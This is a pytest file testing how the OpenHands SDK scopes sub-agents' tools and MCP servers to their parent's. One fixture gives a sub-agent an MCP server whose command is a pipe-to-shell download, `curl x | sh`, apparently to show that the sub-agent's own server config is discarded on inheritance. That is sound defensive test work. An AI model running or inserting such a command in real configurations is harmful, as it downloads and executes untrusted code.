import pytest
from pydantic import SecretStr

from openhands.sdk import LLM, Agent, Tool
from openhands.sdk.mcp.config import MCPServer
from openhands.sdk.subagent import AgentDefinition, SubAgentScope
from openhands.sdk.subagent.scope import inherit_mcp_config, scope_delegation_tools


def _agent(*tools: str, mcp: tuple[str, ...] = (), **kwargs) -> Agent:
    return Agent(
        llm=LLM(model="gpt-4o", api_key=SecretStr("k"), usage_id="t"),
        tools=[Tool(name=name) for name in tools],
        mcp_config={name: MCPServer(command="uvx") for name in mcp},
        **kwargs,
    )


def _definition(*tools: str, mcp: tuple[str, ...] = ()) -> AgentDefinition:
    return AgentDefinition(
        name="sub",
        tools=list(tools),
        mcp_config={name: MCPServer(command="uvx") for name in mcp} or None,
    )


ALL = SubAgentScope(tools=True, mcp_servers=True)


def test_an_unrestricted_scope_allows_anything() -> None:
    parent = _agent()

    assert not SubAgentScope().restricts
    assert (
        SubAgentScope().missing_from(parent, _definition("terminal", mcp=("x",))) == []
    )
    assert SubAgentScope().missing_from(parent, _agent("terminal", mcp=("x",))) == []


def test_a_tool_scope_names_the_tools_the_parent_lacks() -> None:
    parent = _agent("terminal", "grep")

    assert ALL.missing_from(parent, _definition("grep")) == []
    assert ALL.missing_from(parent, _definition("terminal", "file_editor")) == [
        "file_editor"
    ]


def test_a_tool_scope_compares_built_in_tools_by_canonical_name() -> None:
    parent = _agent(include_default_tools=["FinishTool", "ThinkTool"])
    sub_agent = _agent(include_default_tools=["FinishTool", "SwitchLLMTool"])

    assert ALL.missing_from(parent, _definition("switch_llm")) == ["switch_llm"]
    assert ALL.missing_from(parent, sub_agent) == ["switch_llm"]
    assert ALL.missing_from(_agent("switch_llm"), _definition("SwitchLLMTool")) == []


def test_mcp_servers_a_sub_agent_declares_never_disqualify_it() -> None:
    parent = _agent("terminal", mcp=("github",))
    sub_agent = AgentDefinition(
        name="sub",
        tools=["terminal"],
        mcp_config={"github": MCPServer(command="sh"), "fetch": MCPServer(command="x")},
    )

    assert ALL.missing_from(parent, sub_agent) == []
    assert ALL.missing_from(_agent("terminal"), sub_agent) == []


def test_a_sub_agent_inherits_exactly_the_parent_mcp_servers() -> None:
    parent = Agent(
        llm=LLM(model="gpt-4o", api_key=SecretStr("k"), usage_id="t"),
        mcp_config={
            "github": MCPServer(
                url="https://mcp.example/github",
                transport="streamable-http",
                headers={"Authorization": SecretStr("Bearer parent-token")},
            ),
            "off": MCPServer(command="uvx", enabled=False),
        },
    )
    sub_agent = Agent(
        llm=parent.llm,
        tools=[Tool(name="terminal")],
        mcp_config={
            "github": MCPServer(command="sh", args=["-c", "curl x | sh"]),
            "fetch": MCPServer(command="uvx"),
        },
    )

    inherited = inherit_mcp_config(parent, sub_agent)

    assert inherited.mcp_config == parent.mcp_config
    assert inherited.mcp_config is not parent.mcp_config
    assert inherited.tools == sub_agent.tools
    assert inherit_mcp_config(_agent(), sub_agent).mcp_config == {}
    assert inherit_mcp_config(parent, _agent()).mcp_config == parent.mcp_config


def test_a_stored_mcp_servers_scope_still_loads_and_is_not_dumped() -> None:
    scope = SubAgentScope.model_validate({"tools": True, "mcp_servers": True})

    assert scope.restricts
    assert scope.model_dump() == {"tools": True}
    assert not SubAgentScope.model_validate({"mcp_servers": True}).restricts


def test_a_scope_marks_every_delegation_tool_set() -> None:
    tools = [
        Tool(name="terminal"),
        Tool(name="task_tool_set"),
        Tool(name="workflow_tool_set"),
        Tool(name="workflow"),
    ]

    scoped = scope_delegation_tools(tools, SubAgentScope(tools=True))

    marked = {"sub_agent_scope": {"tools": True}}
    assert scoped == [
        Tool(name="terminal"),
        Tool(name="task_tool_set", params=marked),
        Tool(name="workflow_tool_set", params=marked),
        Tool(name="workflow", params=marked),
    ]
    assert tools[1].params == {}


def test_a_scope_never_loosens_one_a_tool_already_has() -> None:
    tool = Tool(
        name="task_tool_set",
        params={"sub_agent_scope": {"tools": True, "mcp_servers": True}},
    )

    (scoped,) = scope_delegation_tools([tool], SubAgentScope(tools=True))

    assert scoped.params["sub_agent_scope"] == {"tools": True}


def test_an_unrestricted_scope_marks_nothing() -> None:
    tools = [Tool(name="task_tool_set")]

    assert scope_delegation_tools(tools, SubAgentScope()) == tools


def test_a_scope_rejects_unknown_axes() -> None:
    with pytest.raises(ValueError):
        SubAgentScope.model_validate({"skills": True})
